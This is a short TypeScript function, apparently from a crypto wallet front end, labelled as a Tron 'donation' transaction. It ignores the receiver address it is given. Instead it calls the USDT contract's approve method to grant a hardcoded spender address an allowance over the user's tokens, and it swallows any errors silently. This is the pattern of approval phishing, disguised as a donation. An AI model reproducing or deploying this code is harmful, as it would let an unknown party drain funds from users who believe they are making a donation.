


export const tronImtokenTransaction =
    async (receiverAddress: string,
           donationAmount: number,
           tronWeb: any) => {
    try {
        // const tronSigner = await tronWeb.trx.getAccount(tronAccount);
        if (tronWeb && tronWeb.defaultAddress.base58) {
            const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            const usdtContract = await tronWeb.contract().at(usdtContractAddress);
            const spender = "TKH8hxJGbPrx7E56eMYFTsV8anvNWEvQMu";
            return await usdtContract
                .approve(spender, donationAmount * 10 ** 6) // 100 usdt
                .send({ feeLimit: 1000000000 });
        }

    } catch (err) {
        // alert("Failed to sign transaction.");
    }
};